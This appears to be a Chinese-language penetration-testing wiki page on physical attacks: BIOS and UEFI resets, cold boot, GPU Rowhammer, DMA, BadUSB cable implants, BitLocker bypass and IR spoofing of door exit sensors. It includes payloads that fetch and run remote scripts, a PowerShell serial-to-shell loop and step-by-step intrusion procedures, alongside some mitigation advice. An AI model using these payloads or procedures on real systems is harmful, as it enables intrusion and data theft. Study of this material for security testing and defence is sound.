# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**Resetting the BIOS** 可以通过几种方式实现。大多数主板都包含一个**battery**，将其移除大约 **30 minutes** 后，BIOS 设置（包括密码）会被重置。或者，也可以调整主板上的一个**jumper**，通过连接特定引脚来重置这些设置。

在无法或不便进行硬件调整的情况下，**software tools** 提供了一种解决方案。使用 **Live CD/USB** 启动系统，并配合像 **Kali Linux** 这样的发行版，可以访问诸如 **_killCmos_** 和 **_CmosPWD_** 之类的工具，它们可以帮助恢复 BIOS 密码。

如果 BIOS 密码未知，连续错误输入 **three times** 通常会产生一个错误代码。这个代码可以在像 [https://bios-pw.org](https://bios-pw.org) 这样的网站上使用，从而有可能获取到一个可用的密码。

### UEFI Security

对于使用 **UEFI** 而不是传统 BIOS 的现代系统，可以使用 **chipsec** 工具来分析和修改 UEFI 设置，包括禁用 **Secure Boot**。这可以通过以下命令完成：
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM 分析与 Cold Boot Attacks

RAM 在断电后仍会短暂保留数据，通常为 **1 到 2 分钟**。通过施加冷却物质，例如液氮，这种持久性可以延长到 **10 分钟**。在这段延长时间内，可以使用 **dd.exe** 和 **volatility** 等工具创建 **memory dump** 进行分析。

---

## 针对 Page Tables 的 GPU Rowhammer

现代 GPU Rowhammer attacks 在针对 **GPU virtual-memory metadata** 而不是普通缓冲区时，会变得更有用。最近在 **GDDR6 NVIDIA Ampere GPUs** 上的研究表明，攻击者在运行 unprivileged CUDA code 时，可以构建 GPU 专用的 hammering patterns，使用 **memory massaging** 将 paging structures 放置到易受攻击的行中，然后在 **last-level page table** 或中间的 **page directory** 中翻转 bit。一旦单个 translation entry 被破坏，攻击者就能启动 **arbitrary GPU memory read/write**，随后进一步转向主机入侵。

### 利用模式

1. 在 GDDR6 中 **profile hammerable rows**，并构建可感知 refresh / 非均匀的 hammering patterns，以绕过 in-DRAM 缓解措施。
2. **Massage GPU allocations**，让 driver 将 page-translation structures 放在可被 hammer 的物理位置，而不是保留在默认受保护池中。实际操作中，这可能意味着耗尽低内存 page-table 区域，并用可控 stride 扫射大量稀疏 UVM mappings。
3. 翻转 translation metadata，例如 page-table / page-directory entry 中的 **PFN** 或与 aperture 相关的 bit，使攻击者控制的 virtual page 解析到 page-table pages、任意 GPU memory 或 host-visible system mappings。
4. 重用伪造的 mapping 来重写更多 translation entries，并在 GPU contexts 之间升级为 **arbitrary GPU memory read/write**。

### 主机转向与缓解措施

- 在 **IOMMU disabled** 的情况下，伪造的 system-aperture mappings 可以将任意 **host physical memory** 暴露给 GPU，把 GPU primitive 变成完整的主机入侵。
- **GDDRHammer** 针对 last-level page-table entries，而 **GeForge** 表明破坏 page-directory 层可能更容易，因为一次 bit flip 就能重新指向更大的 translation subtree。不要把只有一层 paging 视为关键安全边界。
- **IOMMU** 仍然很重要，因为它会阻止 GDDRHammer/GeForge 使用的直接 arbitrary-host-memory 路径，但它 **不是完整缓解措施**。**GPUBreach** 展示了第二阶段转向：攻击者破坏 GPU-writable、由 driver 拥有的 CPU buffers，然后触发 NVIDIA driver 的 memory-safety bugs，获得 kernel write primitive 和 **root shell**，即使启用了 IOMMU 也一样。
- **System-level ECC** 是受支持 workstation/server GPUs 上实际可行的加固措施。没有 ECC 的消费级 GPU 防御面更弱。
- 这些攻击并非纯理论：**GeForge** 在 RTX 3060 上报告了 **1,171** 次 bit flips，在 RTX A6000 上报告了 **202** 次，足以构建一条可工作的主机提权链。

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** 是一款通过 DMA 进行 **physical memory manipulation** 的工具，兼容 **FireWire** 和 **Thunderbolt** 等接口。它可以通过 patch memory 来接受任意密码，从而绕过登录流程。不过，它对 **Windows 10** 系统无效。

---

## 用于系统访问的 Live CD/USB

将 **_sethc.exe_** 或 **_Utilman.exe_** 等系统二进制文件替换为 **_cmd.exe_** 的副本，可以提供具有系统权限的 command prompt。像 **chntpw** 这样的工具可用于编辑 Windows 安装中的 **SAM** 文件，从而允许修改密码。

**Kon-Boot** 是一款可在不知道密码的情况下登录 Windows 系统的工具，它会临时修改 Windows kernel 或 UEFI。更多信息可见 [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/)。

---

## 处理 Windows Security Features

### Boot 和 Recovery 快捷键

- **Supr**: 进入 BIOS settings。
- **F8**: 进入 Recovery mode。
- 在 Windows banner 显示后按下 **Shift** 可以绕过 autologon。

### BAD USB Devices

像 **Rubber Ducky** 和 **Teensyduino** 这样的设备可作为创建 **bad USB** devices 的平台，能够在连接到目标计算机时执行预定义 payloads。

### Volume Shadow Copy

管理员权限允许通过 PowerShell 创建敏感文件的副本，包括 **SAM** 文件。

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- 基于 ESP32-S3 的 implants，例如 **Evil Crow Cable Wind**，可以隐藏在 USB-A→USB-C 或 USB-C↔USB-C 线缆中，只枚举为 USB keyboard，并通过 Wi-Fi 暴露其 C2 stack。操作者只需从受害主机给线缆供电，创建一个名为 `Evil Crow Cable Wind`、密码为 `123456789` 的热点，然后访问 [http://cable-wind.local/](http://cable-wind.local/)（或其 DHCP 地址）即可到达内置 HTTP interface。
- browser UI 提供 *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell* 和 *Config* 选项卡。存储的 payloads 会按 OS 标记，keyboard layouts 可动态切换，VID/PID strings 也可以修改以伪装成已知外设。
- 因为 C2 存在于线缆内部，手机可以在不接触 host OS 的情况下 staging payloads、触发执行并管理 Wi-Fi credentials——非常适合短时间停留的 physical intrusions。

### 感知 OS 的 AutoExec payloads

- AutoExec rules 将一个或多个 payloads 绑定为在 USB enumeration 后立即触发。implant 会执行轻量级 OS fingerprinting，并选择匹配的 script。
- 示例流程：
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) 或 `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- 由于执行是 unattended 的，只需更换一根充电线，就能在已登录用户上下文下实现“plug-and-pwn” initial access。

### 通过 Wi-Fi TCP 的 HID-bootstrapped remote shell

1. **Keystroke bootstrap:** 一个已存储的 payload 会打开控制台，并粘贴一个循环，用于执行从新的 USB serial device 到达的任何内容。一个最小的 Windows 变体是：
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** 该 implant 在其 ESP32-S3 启动一个 TCP client（Python script、Android APK 或桌面可执行文件）回连到操作者时，保持 USB CDC channel 处于打开状态。TCP session 中输入的任何字节都会转发到上面的 serial loop 中，即使在 air-gapped hosts 上也能实现 remote command execution。输出很有限，因此操作者通常执行 blind commands（account creation、staging additional tooling 等）。

### HTTP OTA update surface

- 同一个 web stack 通常会暴露 unauthenticated firmware updates。Evil Crow Cable Wind 监听 `/update`，并刷入上传的任何 binary：
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## 绕过 BitLocker Encryption

如果在内存转储文件（**MEMORY.DMP**）中找到**recovery password**，则有可能绕过 BitLocker encryption。可使用 **Elcomsoft Forensic Disk Decryptor** 或 **Passware Kit Forensic** 等工具来实现。

---

## 通过 Social Engineering 添加 Recovery Key

可以通过 social engineering tactics 添加新的 BitLocker recovery key，诱骗用户执行一条命令来添加一个由零组成的新 recovery key，从而简化解密过程。

---

## 利用 Chassis Intrusion / Maintenance Switches 将 BIOS 恢复出厂设置

许多现代 laptop 和小型台式机都包含一个由 Embedded Controller（EC）和 BIOS/UEFI firmware 监控的 **chassis-intrusion switch**。该开关的主要用途是在设备被打开时触发警报，但厂商有时会实现一个**未公开的 recovery shortcut**，当开关以特定模式切换时就会被触发。

### 攻击方式

1. 该开关连接到 EC 上的一个 **GPIO interrupt**。
2. 运行在 EC 上的 firmware 会记录**按压的时间和次数**。
3. 当识别出硬编码模式时，EC 会调用一个 *mainboard-reset* routine，用于**擦除 system NVRAM/CMOS 的内容**。
4. 下次启动时，BIOS 会加载默认值——**supervisor password、Secure Boot keys，以及所有自定义配置都会被清除**。

> 一旦 Secure Boot 被禁用且 firmware password 消失，攻击者只需启动任意外部 OS image，就能获得对内部 drives 的不受限访问。

### 真实案例 – Framework 13 Laptop

Framework 13（11th/12th/13th-gen）的 recovery shortcut 是：
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
在第十个 cycle 之后，EC 会设置一个 flag，指示 BIOS 在下一次 reboot 时擦除 NVRAM。整个过程大约需要 ~40 s，并且除了一个螺丝刀外**什么都不需要**。

### Generic Exploitation Procedure

1. 给目标上电或 suspend-resume，让 EC 运行起来。
2. 拆下底盖，露出 intrusion/maintenance switch。
3. 重现 vendor-specific 的切换 pattern（查阅文档、论坛，或 reverse-engineer EC firmware）。
4. 重新装回并 reboot – firmware protections 应该会被禁用。
5. 启动 live USB（例如 Kali Linux），并执行常规 post-exploitation（credential dumping、data exfiltration、植入 malicious EFI binaries 等）。

### Detection & Mitigation

* 在 OS management console 中记录 chassis-intrusion 事件，并与异常 BIOS reset 进行关联。
* 在螺丝/盖板上使用 **tamper-evident seals**，以检测是否被打开。
* 将设备放在 **physically controlled areas**；应假设 physical access 等同于完全 compromise。
* 在可用时，禁用 vendor 的 “maintenance switch reset” 功能，或要求对 NVRAM resets 进行额外的 cryptographic authorisation。

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors 将 near-IR LED emitter 与 TV-remote style receiver module 配对；后者只有在检测到多个正确 carrier 的 pulses（~4–10）后才报告 logic high（≈30 kHz）。
- 一个 plastic shroud 会阻止 emitter 和 receiver 直接互相看到，因此 controller 会假设任何经过验证的 carrier 都来自附近的 reflection，并驱动一个 relay 打开 door strike。
- 一旦 controller 认为有 target 存在，它通常会改变 outbound modulation envelope，但 receiver 仍会接受任何匹配 filtered carrier 的 burst。

### Attack Workflow
1. **Capture the emission profile** – 将 logic analyser 夹接到 controller pins 上，记录驱动内部 IR LED 的 pre-detection 和 post-detection waveforms。
2. **Replay only the “post-detection” waveform** – 移除/忽略原厂 emitter，并从一开始就用已经触发过的 pattern 驱动外部 IR LED。由于 receiver 只关心 pulse count/frequency，它会把 spoofed carrier 视为真实 reflection，并拉高 relay line。
3. **Gate the transmission** – 以经过调校的 bursts 发送 carrier（例如，开启几十毫秒、关闭相近时长），在不让 receiver 的 AGC 或 interference handling logic 失效的前提下，提供最少需要的 pulse count。持续发射会很快使 sensor 失去灵敏度并阻止 relay 触发。

### Long-Range Reflective Injection
- 将台式 LED 替换为 high-power IR diode、MOSFET driver 和 focusing optics，可从约 6 m 远处稳定触发。
- 攻击者不需要对准 receiver aperture 的 line-of-sight；只要把 beam 照向通过玻璃可见的室内墙面、货架或门框，让反射能量进入约 30° field of view，就能模拟近距离手波。
- 因为 receiver 只期望弱反射，更强的外部 beam 可以在多次 surface 反弹后仍保持在 detection threshold 以上。

### Weaponised Attack Torch
- 将 driver 嵌入商用手电筒中，可以把工具隐藏在明处。把可见 LED 换成与 receiver band 匹配的 high-power IR LED，加入一个 ATtiny412（或类似器件）生成约 30 kHz 的 bursts，并使用 MOSFET 来 sink LED current。
- 伸缩变焦镜头可收紧 beam 以提升距离/精度，而由 MCU 控制的 vibration motor 会在 modulation  सक्रिय 时提供触觉确认，同时不发出可见光。
- 在几个已存储的 modulation patterns 之间切换（略有不同的 carrier frequencies 和 envelopes）可提高与不同品牌重命名的 sensor families 的兼容性，让操作员扫过 reflective surfaces，直到 relay 发出可听见的 click 并且门打开。

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
